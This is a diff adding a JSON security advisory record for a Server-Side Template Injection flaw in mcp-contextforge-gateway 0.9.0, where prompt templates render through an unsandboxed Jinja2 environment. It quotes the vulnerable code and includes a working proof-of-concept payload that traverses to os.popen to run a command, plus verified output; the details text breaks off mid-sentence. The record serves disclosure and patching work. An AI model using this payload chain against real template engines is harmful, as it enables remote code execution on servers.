@@ -1,0 +1,69 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0182",
+  "modified": "2026-08-26T01:04:48.785581518Z",
+  "published": "2026-08-25T17:42:11Z",
+  "aliases": [
+    "GHSA-vwf3-4xxj-qg6h"
+  ],
+  "summary": "mcp-contextforge-gateway has Server-Side Template Injection (SSTI) leading to Remote Code Execution in `PromptService._render_template` via unsandboxed Jinja2 Environment",
+  "details": "### Summary\n\n`mcpgateway.services.prompt_service.PromptService` renders user-supplied prompt templates using Jinja2's plain `Environment()` rather than `SandboxedEnvironment`. An authenticated user with permission to register or update prompt templates can store a malicious template that, on subsequent rendering, executes arbitrary Python code on the gateway host with the privileges of the gateway process. This is a Server-Side Template Injection (SSTI) vulnerability leading to Remote Code Execution.\n\n### Details\n\n**Affected component:** `mcpgateway/services/prompt_service.py`\n**Affected version:** `0.9.0` (verified). The fix in the unreleased `main` branch indicates all earlier published versions are likewise affected.\n\n**Vulnerable code**\n\n`mcpgateway/services/prompt_service.py`, line 26:\n\n```python\nfrom jinja2 import Environment, meta, select_autoescape\n```\n\n`mcpgateway/services/prompt_service.py`, line 135 (inside `PromptService.__init__`):\n\n```python\nself._jinja_env = Environment(\n    autoescape=select_autoescape([\"html\", \"xml\"]),\n    trim_blocks=True,\n    lstrip_blocks=True,\n)\n```\n\n`mcpgateway/services/prompt_service.py`, lines 1592–1616 (`_render_template`):\n\n```python\ndef _render_template(self, template: str, arguments: Dict[str, str]) -> str:\n    ...\n    try:\n        jinja_template = self._jinja_env.from_string(template)\n        return jinja_template.render(**arguments)\n    except Exception:\n        try:\n            return template.format(**arguments)\n        except Exception as e:\n            raise PromptError(f\"Failed to render template: {str(e)}\")\n```\n\n`_render_template` is invoked from `PromptService.get_prompt` (line 892):\n\n```python\nrendered = self._render_template(prompt.template, arguments)\n```\n\nWhere `prompt.template` is loaded from the database. The `template` field of the database row is populated via the `register_prompt`, `update_prompt`, and `register_prompts_bulk` API endpoints, which accept attacker-controlled template content from authenticated API callers.\n\nBecause `self._jinja_env` is a plain `jinja2.Environment` rather than `jinja2.sandbox.SandboxedEnvironment`, Jinja2 imposes no restrictions on attribute traversal, function calls, or built-in access during rendering. A template that traverses to `__builtins__.__import__` and calls `os.popen` (or any equivalent chain) executes arbitrary code at render time.\n\n### PoC\n\nThe reproducer requires only the published package and a Python interpreter; no network, database, or container setup is needed because the vulnerability sits in the in-process render method.\n\n**Setup**\n\n```bash\npip install mcp-contextforge-gateway==0.9.0\n```\n\n**Reproducer (`poc.py`)**\n\n```python\nimport os\nimport warnings\n\nwith warnings.catch_warnings():\n    warnings.simplefilter(\"ignore\")\n    from mcpgateway.services.prompt_service import PromptService\n\nimport mcpgateway\nprint(f\"[+] mcpgateway version: {mcpgateway.__version__}\")\n\nPROOF = os.path.abspath(\"MCPGATEWAY_RCE_PROOF.txt\")\nif os.path.exists(PROOF):\n    os.remove(PROOF)\n\nservice = PromptService()\nprint(f\"[+] PromptService._jinja_env type: {type(service._jinja_env).__name__}\")\n\npayload = (\n    \"{{ self.__init__.__globals__.__builtins__\"\n    \".__import__('os').popen('echo MCPGATEWAY_RCE > \"\n    + PROOF.replace('\\\\', '/') + \"').read() }}\"\n)\n\nprint(f\"[+] PROOF exists before render: {os.path.exists(PROOF)}\")\nservice._render_template(payload, {})\nprint(f\"[+] PROOF exists after render:  {os.path.exists(PROOF)}\")\n\nif os.path.exists(PROOF):\n    with open(PROOF) as f:\n        print(f\"[+] PROOF contents: {f.read().strip()!r}\")\n```\n\n**Verified output**\n\n```\n[+] mcpgateway version: 0.9.0\n[+] PromptService._jinja_env type: Environment\n[+] PROOF exists before render: False\n[+] PROOF exists after render:  True\n[+] PROOF contents: 'MCPGATEWAY_RCE'\n```\n\nThe file `MCPGATEWAY_RCE_PROOF.txt` is written to disk by the embedded `os.popen` call, demonstrating arbitrary command execution in the gateway process. Replacing `echo MCPGATEWAY_RCE > ...` wit\n\nImported from OSV GHSA-vwf3-4xxj-qg6h.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-vwf3-4xxj-qg6h"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/IBM/mcp-context-forge/security/advisories/GHSA-vwf3-4xxj-qg6h"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/IBM/mcp-context-forge/issues/538"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/IBM/mcp-context-forge/pull/4072"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/IBM/mcp-context-forge/commit/4d31004661858a2e99055b3c0c9f14218b8f7120"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/IBM/mcp-context-forge"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/IBM/mcp-context-forge/releases/tag/v1.0.0"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "mcp-contextforge-gateway"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.0.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "mcp_server",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "high"
+  }
+}
